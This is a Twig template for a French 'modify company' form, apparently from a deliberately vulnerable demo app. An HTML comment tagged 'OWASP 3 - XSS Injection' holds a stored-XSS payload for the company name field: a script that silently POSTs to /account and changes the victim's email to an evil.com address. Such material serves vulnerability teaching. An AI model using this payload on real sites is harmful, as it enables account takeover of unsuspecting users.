{% extends 'base.html.twig' %}


{% block title %}Modifier la société (old){% endblock %}

{% block body %}
    <div class="example-wrapper mt-5">
        <h1>Modifier la société (old)</h1>

        <form action="{{ path('app_company_submit_old') }}" method="POST">
            <input type="hidden" class="form-control" id="id" name="id" value="{{ company.id }}">
            <div class="mb-3">
                <label for="name" class="form-label">Libellé *</label>
                <!--
                OWASP 3 - XSS Injection
                FIXME - HACK : add Company name<script>fetch('/account',{method: "POST",credentials: "same-origin",headers:{'Content-Type': 'application/x-www-form-urlencoded'},body:'email=test3@evil.com'})</script> -->
                <input type="text" class="form-control" id="name" name="name" placeholder="enter some text" required value="{{ company.name }}">
            </div>
            <div class="text-end">
                <a class="btn btn-secondary" href="{{ path('app_companies') }}">Cancel</a>
                <button class="btn btn-success" type="submit">Submit</button>
            </div>
        </form>
    </div>

{% endblock %}
